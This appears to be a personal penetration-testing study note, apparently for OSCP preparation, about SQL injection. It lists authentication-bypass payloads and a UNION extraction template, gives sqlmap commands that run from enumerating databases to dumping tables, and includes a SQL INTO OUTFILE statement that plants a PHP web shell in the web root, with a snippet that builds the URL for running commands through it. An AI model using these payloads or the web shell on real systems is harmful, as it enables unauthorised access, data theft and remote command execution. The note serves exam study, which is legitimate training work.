[[Synced OSCP Notes/Tools/SQLmap|SQLmap]]

```
cd /usr/share/wordlists/seclists/Fuzzing/Databases/
```

```
cat /usr/share/wordlists/seclists/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt
```

---
# 🧠 SQL Injection Payloads (Auth Bypass / Login Bypass)

## 🔓 Basic authentication bypass

```
' OR 1=1--
```

```
' OR '1'='1--
```

```
' OR ''=''
```

---

## 👤 Username-based bypass

```
<username>' OR 1=1--
```

```
<username>'--
```

---

## 🧪 Common tautology bypass

```
' OR '1'='1'--
```

```
' OR 'a'='a'--
```

---

## 🧬 UNION-based injection (data extraction / testing columns)

```
' UNION SELECT 1, '<user-fieldname>', '<pass-fieldname>'--
```


---

SQLMAP

Intercept a web request of "test", copy the post request and save it to a file called reset.req

Feed this to SQLmap

```
sqlmap -r reset.req -p email --batch
```

```
sqlmap -r reset.req -p email --batch --level 3
```

get a list of the available databases
```
sqlmap -r reset.req -p email --batch --level 3 --dbs
```

enumerate tables in database
```
sqlmap -r reset.req -p email --batch --level 3 -D [database_name] --tables --threads=10
```

dump a table's contents
```
sqlmap -r reset.req -p email --batch --level 3 -D [database_name] -T [table_name] --dump
```

---

[[Synced OSCP Notes/Small Toolkit/Tools/Hashcat|Hashcat]]

---

![[Pasted image 20260526210214.png]]

```
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"
```
 
Burpsuite payload, upload a webshell.

Since nmap scan told us port 3305 is open, we are uploading the webshell there

Visit
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}:3305/webshell.php?cmd=id`;

dv.paragraph("```bash\n" + command + "\n```");
```
